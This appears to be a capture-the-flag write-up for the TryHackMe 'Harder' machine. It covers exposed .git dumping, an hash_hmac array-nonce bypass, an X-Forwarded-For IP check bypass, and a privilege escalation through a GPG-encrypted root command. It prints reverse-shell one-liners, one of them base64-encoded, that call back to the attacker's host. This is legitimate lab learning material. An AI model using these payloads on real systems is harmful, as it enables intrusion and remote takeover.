# Harder
https://tryhackme.com/room/harder | IP= 10.10.221.180/ \*.harder.local | 2022-07-13

## Initial Enumeration
```
┌──(kali㉿hotdog)-[~/Desktop]
└─$ rustscan -a $IP --ulimit 5000 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.221.180:2
Open 10.10.221.180:22
Open 10.10.221.180:80

2/tcp  open  ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (protocol 2.0)                                                                                                                                
22/tcp open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)                  
80/tcp open  http    syn-ack nginx 1.18.0
| http-git:                
|   10.10.221.180:80/.git/                
|     Git repository found!                                                                         
|     .gitignore matched patterns 'secret'                                                          
|     Repository description: Unnamed repository; edit this file 'description'                                                                     
|_http-title: Harder Corp. - Password Manager                                                       
|_http-server-header: nginx/1.18.0 
```

From the initial scan 2 things grabbed my eyes.
1.  Port 2 is open running an older version of SSH.
2. Nmap found a .git folder in the webserver.

I started checking the SSH first, looking for a quick win vulnerability
```
┌──(kali㉿hotdog)-[~/Desktop]
└─$ searchsploit openssh 7.6p1          
 ---------------------------------
 Exploit Title |  Path
 ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC) | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2) | linux/remote/45939.py
 ---------------------------------
```
All I found were user enumeration scripts that didn't work. So I decided to leave this be for now, and go to the web-server.

## Web Enumeration
First when visiting the site, we encounter a 404 error page. Looking at the page we see *"This page is powered by php-fpm"*. Since I couldn't find a version for it, I tried running a few exploits I found online for this service, however none of them worked.
I continued by running feroxbuster in the background, while looking at the request from the dev-tools.
Looking at the request, I found it trying to set a *"TestCookie"*: `domain	"pwd.harder.local"`
This led me to believe there's a vhost service for this site, so I added `pwd.harder.local` and `harder.local` to `/etc/hosts` and started feroxbuster on these domains, as well as a vhost enum scan with gobuster.

Here are the scan results:
1. VHost Scan - Found another sub-domain site.
```
┌──(kali㉿hotdog)-[~/Desktop]
└─$ gobuster vhost -u $IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 32

Found: shell.harder.local (Status: 200) [Size: 19912]
```

2. PWD sub-domain scan - Found a few pages + secret git folder.
```
┌──(kali㉿hotdog)-[~/Desktop]                                                                                                                                                                           
└─$ feroxbuster --url http://$IP/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -e

301      GET        7l       11w      169c http://pwd.harder.local/.git => http://pwd.harder.local:8080/.git/                                                                                           
200      GET        1l        2w       23c http://pwd.harder.local/.git/HEAD
200      GET        5l       13w       92c http://pwd.harder.local/.git/config      
200      GET        3l        7w      361c http://pwd.harder.local/.git/index
200      GET        2l        2w       27c http://pwd.harder.local/.gitignore
403      GET        7l        9w      153c http://pwd.harder.local/.git/logs/
200      GET       23l      457w        0c http://pwd.harder.local/index.php
200      GET       23l      457w        0c http://pwd.harder.local/
200      GET        0l        0w        0c http://pwd.harder.local/auth.php
200      GET        0l        0w        0c http://pwd.harder.local/credentials.php
200      GET        0l        0w        0c http://pwd.harder.local/secret.php
```

3. Shell sub-domain scan - Found a few pages.
```
┌──(kali㉿hotdog)-[~/Desktop]
└─$ feroxbuster --url http://$IP/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -e

200      GET       23l      457w        0c http://shell.harder.local/index.php
200      GET       23l      457w        0c http://shell.harder.local/
200      GET        0l        0w        0c http://shell.harder.local/auth.php
200      GET        1l       13w        0c http://shell.harder.local/ip.php
301      GET        7l       11w      169c http://shell.harder.local/vendor => http://shell.harder.local:8080/vendor/
```

## PWD Sub-domain.
I started manually checking the pages while all these scans took place.
I started first by checking the pwd domain.
When first visiting it, I was greeted with a nice login page. Instinctively I tried logging in with `admin:admin`, and to my surprise it worked!

However I was quickly greeted with a `400 Bad Request` error, saying *"extra security in place. our source code will be reviewed soon ..."*.
I tried looking at the request itself a bit and trying other entries, but it didn't seem to do anything, so I moved on to check the other pages.
All the other pages returned 200 with no output, so after testing them with POST+Get requests, I assumed they were commands for internal use, and I won't get anything by fuzzing them.

So I continued to the `.git` folder I found. After playing with it for a bit, it seemed like a valid accessible `.git` directory, so I used the tool: https://github.com/internetwache/GitTools to dump and construct the files from the git folder.

Dumping the web folder to my local machine:
```
┌──(kali㉿hotdog)-[~/Desktop/GitTools/Dumper]
└─$ ./gitdumper.sh http://pwd.harder.local/.git/ harder-ctf

[...]
[+] Creating harder-ctf/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[...]
[+] Downloaded: objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c
```

Extraction of the git folder:
```
┌──(kali㉿hotdog)-[~/Desktop/GitTools/Extractor]
└─$ ./extractor.sh ../Dumper/harder-ctf harder-ctf

[...]
[+] Found commit: 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
[+] Found file: /home/kali/Desktop/GitTools/Extractor/harder-ctf/0-047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161/auth.php
[...]
[+] Found file: /home/kali/Desktop/GitTools/Extractor/harder-ctf/2-9399abe877c92db19e7fc122d2879b470d7d6a58/index.php
```

Visiting the latest entry of the newly constructed commits folders (aka the live site version), I found multiple files which correlated with my feroxbuster scan.
```
auth.php  commit-meta.txt  hmac.php  index.php
```

## Bypassing the security check
After briefly going over the files, the most important one I found was `hmac.php`:
```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```
This file was interesting, because it seemed to be the cause of the 400 error I got when first logging in.
After going over the code, it looked really familiar to something I had seen in the past in one of liveoverflow's videos. After a quick search I found it.
https://www.youtube.com/watch?v=MpeaSNERwQA

This isn't really ctf-ish to say I just had a lucky remember and blindly follow the video. So i'll try to explain how this security check can be bypassed.

The code starts with verifiying it has all the parameters it needs in the get request:
- `h` - hmac hash
- `host` - plain-text to hash

The code then imports a file called `secret.php` that contains some sort of a secret. However in the git commits folder, I found a `gitignore` file that included it (a `gitignore` file tells git to not track certain files - so since the file with the secret wasn't tracked, my previous dump of the git folder couldn't get it).

Anyways, the code then checks if a parameter `n` nonce was inputted, if it was, it hashes the secret with that nonce - Do keep in mind, that the `n` parameter was placed directly inside of the command without any sanitation or type check beforehand.

Afterwards the code tries to create a hash of the plain-text inputted + the secret, and compare it with the `h` hash parameter given by the user.

Now you may think, that without the secret file it's impossible to make a hash-collision to bypass the check. However do you remember what I said before? We, the user, have complete control over the nonce parameter. So we just need to figure out a way to make the secret predictable with the nonce. So after playing with the values and types for a bit, we try to change the value to an array.

```
php > var_dump(hash_hmac('sha256', array(), "secret-asdkhg"));
PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1
NULL
```

And what's that? with an array the function only throws a warning and return NULL! No error. Null is a predictable value, so with it we can know what the hash will be ahead of time. In other words, we bypassed the security check!

So let's craft a random hash:
```
php > var_dump(hash_hmac('sha256', '1', NULL));
string(64) "41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523"
```

And use it as a payload:
```
http://pwd.harder.local/index.php?n[]=a&host=1&h=41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523
```

This bypassed the check and let us in. After getting it, the pwd - password manager site, does as it says, and shows us the passwords it manages:
```
url | username | password (cleartext)

http://shell.harder.local | evs | [Redacted]
```

## Shell sub-domain
Visiting the shell sub-domain, we find a similar login page. I tried using `admin:admin` just to see if it'd work again, however it didn't. Luckily I found the credentials a few moments ago.
Using the found creds, we manage to login, however we are greeted with another security check block: *"Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed"*.
From previous knowledge, I knew there's a http header called `X-Forwarded-For: [IP]` which it usually used with proxies, so the server would know who is the original person that made the request, however this header can also be abused to bypass checks like this, unless properly checked by the server.

So I intercepted the request with burp, and added the header to the request. I was then greeted with a scuffed web shell.

I tried using a bash reverse shell script, however it seemed like the machine didn't have bash, so I used a php reverse shell one liner from: https://www.revshells.com
`php -r '$sock=fsockopen("10.8.89.237",4444);shell_exec("/bin/sh <&3 >&3 2>&3");'`

and got a shell as www-data:
```
┌──(kali㉿hotdog)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.89.237] from (UNKNOWN) [10.10.221.180] 50392
id
uid=1001(www) gid=1001(www) groups=1001(www)
```

## Shell
### www-data
I started by trying to stabilize the shell for easier use, however since bash wasn't on the system, I failed to do so.
After some manual enumeration, I found that this was some sort of container, and most binaries were just busybox.
I decided to whip-up a linpeas scan for a quick overview of the machine.

With the script I found a few things I though were worth taking a look:
- evs-backup.sh in `/etc/periodic/15min` - Possible "cron" I can hijack.
- Internal open ports - 8080, 9000 - Possible vulnerable services to break out of the container.
- The terminal was ash - Just something I thought was good to know.
- `/usr/local/bin/execute-crypted` - Peculiar SUID binary that might be vulnerable.
- `/usr/local/bin/run-crypted.sh` - Seems related to the SUID binary.

I started by looking at the backup script, thinking there's something inside I could hijack. However all I found inside was a note:
```
# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "[Redacted]"
```

So that was a quick way to priv-esc to another user :)

### evs
I logged in via ssh with the previously found password, and managed to get a tty (thank god) shell as the user evs.
Inside the home folder I found the user flag. Afterwards I decided that before I start manually enumerating, it's worth running linpeas again, in case there are files that evs has access to that www-data didn't.

Luckily my intuition was right:
```
╔══════════╣ Readable files belonging to root and readable by me but not world readable         
-rwsr-x---    1 root     evs          19960 Jul  6  2020 /usr/local/bin/execute-crypted
-rwxr-x---    1 root     evs            412 Jul  7  2020 /usr/local/bin/run-crypted.sh                                                                                                                  
-rwxr-x---    1 root     evs            641 Jul  7  2020 /var/backup/root@harder.local.pub
```
linpeas managed to relate the peculiar files I found before + a public key that might be related.

I started by checking the `run-crypted.sh` script, and found a manual on how to run commands as root:
```
[*] Current User: evs
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
```

I followed this explanation with the key linpeas found for me:
```
harder:/dev/shm$ gpg --import /var/backup/root@harder.local.pub
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1

harder:/dev/shm$ echo "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjguODkuMjM3Iiw0NDQ0KTtzaGVsbF9leGVjKCIvYmluL3NoIDwmMyA+JjMgMj4mMyIpOyc=" | base64 -d > /tmp/command [Base64 php rev shell 1 liner]

harder:/dev/shm$ gpg --encrypt -r root --output /tmp/command.gpg /tmp/command

harder:/dev/shm$ execute-crypted /tmp/command.gpg
```

I then got a ping-back on my netcat listener as root. And gg.
```
id
uid=0(root) gid=1000(evs) groups=1000(evs)

cat /root/root.txt
[Redacted]
```

## Final words.
Overall, this machine was really fun and challenging. Especially the entry part. Combining the exposed git repo, as well as the insecure code, was just really rewarding.
Although the privesc could've been harder then just running linpeas, this machine was really fun.